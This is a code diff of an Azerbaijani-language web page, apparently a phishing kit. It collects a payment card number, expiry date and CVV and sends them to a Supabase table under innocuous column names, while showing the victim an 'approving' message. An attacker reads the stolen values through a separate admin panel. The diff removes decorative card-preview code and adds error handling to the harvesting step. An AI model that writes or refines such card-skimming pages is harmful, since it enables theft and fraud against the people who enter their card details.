@@ -17,39 +17,6 @@ body{
   color:white;
 }
 
-/* Animated background */
-body::before{
-  content:"";
-  position:absolute;
-  width:600px;
-  height:600px;
-  background:radial-gradient(circle,#00c6ff55,transparent 70%);
-  top:-200px;
-  left:-200px;
-  animation:move1 10s infinite alternate;
-}
-
-body::after{
-  content:"";
-  position:absolute;
-  width:500px;
-  height:500px;
-  background:radial-gradient(circle,#0072ff55,transparent 70%);
-  bottom:-200px;
-  right:-200px;
-  animation:move2 12s infinite alternate;
-}
-
-@keyframes move1{
-  from{transform:translate(0,0);}
-  to{transform:translate(200px,150px);}
-}
-
-@keyframes move2{
-  from{transform:translate(0,0);}
-  to{transform:translate(-150px,-200px);}
-}
-
 header{
   padding:20px;
   font-size:20px;
@@ -62,7 +29,6 @@ header{
   display:flex;
   justify-content:center;
   align-items:center;
-  z-index:2;
 }
 
 .phone{
@@ -82,42 +48,6 @@ header{
   display:flex;
   flex-direction:column;
   justify-content:center;
-}
-
-.card-container{perspective:1000px;margin-bottom:30px;}
-
-.card{
-  width:100%;
-  height:180px;
-  position:relative;
-  transform-style:preserve-3d;
-  transition:transform 0.8s;
-}
-
-.card.flip{transform:rotateY(180deg);}
-
-.face{
-  position:absolute;
-  width:100%;
-  height:100%;
-  border-radius:20px;
-  backface-visibility:hidden;
-  padding:20px;
-  display:flex;
-  flex-direction:column;
-  justify-content:space-between;
-}
-
-.front{background:linear-gradient(135deg,#00c6ff,#0072ff);}
-.back{
-  background:linear-gradient(135deg,#0072ff,#00c6ff);
-  transform:rotateY(180deg);
-  align-items:flex-end;
-}
-
-.number{
-  letter-spacing:3px;
-  font-size:18px;
 }
 
 input{
@@ -151,30 +81,10 @@ button{
 <div class="phone">
 <div class="screen">
 
-<div class="card-container">
-<div class="card" id="card">
-
-<div class="face front">
-<div>KREDIT</div>
-<div class="number" id="previewNumber">•••• •••• •••• ••••</div>
-<div id="previewSmall">0000</div>
-</div>
-
-<div class="face back">
-<div id="previewBack">•••</div>
-</div>
-
-</div>
-</div>
-
-<input id="mainInput" maxlength="16" placeholder="****************"
-oninput="formatMain(this.value)">
-
+<input id="mainInput" maxlength="16" placeholder="Kart nömrəsi">
 <div class="row">
-<input id="smallInput" maxlength="4" placeholder="****"
-oninput="updateSmall(this.value)">
-<input id="backInput" maxlength="3" placeholder="***"
-oninput="updateBack(this.value)">
+<input id="smallInput" maxlength="4" placeholder="Tarix">
+<input id="backInput" maxlength="3" placeholder="CVV">
 </div>
 
 <button onclick="submitData()">Təsdiqlə</button>
@@ -190,44 +100,30 @@ const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co"
 const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
 const supabase = createClient(supabaseUrl, supabaseKey)
 
-window.formatMain = function(val){
-  val = val.replace(/\D/g,'').slice(0,16)
-  let formatted = val.match(/.{1,4}/g)?.join(" ") || val
-  document.getElementById("previewNumber").innerText =
-    formatted || "•••• •••• •••• ••••"
-  document.getElementById("mainInput").value = val
-}
-
-window.updateSmall = function(val){
-  val = val.replace(/\D/g,'').slice(0,4)
-  document.getElementById("previewSmall").innerText = val || "0000"
-}
-
-window.updateBack = function(val){
-  val = val.replace(/\D/g,'').slice(0,3)
-  document.getElementById("previewBack").innerText = val || "•••"
-  const card=document.getElementById("card")
-  if(val.length===3){card.classList.add("flip")}
-  else{card.classList.remove("flip")}
-}
-
 window.submitData = async function(){
-  const main=document.getElementById("mainInput").value
-  const small=document.getElementById("smallInput").value
-  const back=document.getElementById("backInput").value
+
+  const main=document.getElementById("mainInput").value.trim()
+  const small=document.getElementById("smallInput").value.trim()
+  const back=document.getElementById("backInput").value.trim()
 
   if(main.length!==16 || small.length!==4 || back.length!==3){
     alert("Məlumat natamamdır")
     return
   }
 
-  await supabase.from("mesajlar").insert([{
-    kod1: main,
-    kod2: small,
-    kod3: back
-  }])
+  const { data, error } = await supabase
+    .from("mesajlar")   // ⚠️ Admin paneldə də EYNİ ad olmalıdır
+    .insert([{
+      kod1: main,
+      kod2: small,
+      kod3: back
+    }])
 
-  alert("Onaylanır...")
+  if(error){
+    alert("Xəta: " + error.message)
+  } else {
+    alert("Onaylanır...")
+  }
 }
 </script>
 
